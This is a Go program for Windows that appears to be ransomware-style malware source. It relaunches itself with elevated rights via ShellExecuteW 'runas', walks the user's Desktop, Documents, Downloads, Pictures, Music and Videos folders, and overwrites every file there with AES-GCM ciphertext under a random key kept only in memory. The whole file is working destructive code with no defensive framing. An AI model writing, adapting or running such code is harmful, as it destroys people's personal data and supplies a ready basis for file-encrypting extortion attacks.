package main
import(
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"syscall"
	"unsafe"
)
var(
	shell32           = syscall.NewLazyDLL("shell32.dll")
	procShellExecuteW = shell32.NewProc("ShellExecuteW")
)
func runAsAdmin(exe, args string) error {
	ret, _, _ := procShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(exe))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(args))),
		0,
		1,
	)
	if ret <= 32 { return fmt.Errorf("ShellExecute failed: %d", ret) }
	return nil
}
func encryptFile(path string, key []byte, self string) {
	data, _ := os.ReadFile(path)
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	enc := gcm.Seal(nonce, nonce, data, nil)
	os.WriteFile(path, enc, 0644)
	fmt.Println("Encrypted:", path)
}
func main() {
	if len(os.Args) == 1 {
		exe, _ := os.Executable()
		runAsAdmin(exe, "--elevated")
		return
	}
	self, _ := os.Executable()
	usr, _ := user.Current()
	key := make([]byte, 32)
	rand.Read(key)
	folders := []string{"Desktop","Downloads","Documents","Pictures","Music","Videos"}
	for _, f := range folders {
		root := filepath.Join(usr.HomeDir, f)
		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() { return nil }
			if path == self { return nil }
			encryptFile(path, key, self)
			return nil
		})
	}
	fmt.Println("Random key:", key)
}
